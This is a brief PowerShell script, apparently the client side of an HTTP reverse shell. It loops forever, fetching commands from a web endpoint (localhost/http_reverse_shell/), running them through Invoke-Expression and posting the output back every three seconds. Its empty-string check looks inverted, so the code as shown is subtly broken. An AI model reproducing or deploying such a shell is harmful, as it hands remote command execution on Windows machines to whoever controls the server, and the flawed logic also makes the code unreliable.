While(1) {
    $c = (Invoke-WebRequest localhost/http_reverse_shell/?ready=true).Content
    If($c -eq '') {
        Invoke-WebRequest localhost/http_reverse_shell/ -Method Post -Body @{'stdout' = iex $c}
    }
    sleep 3
}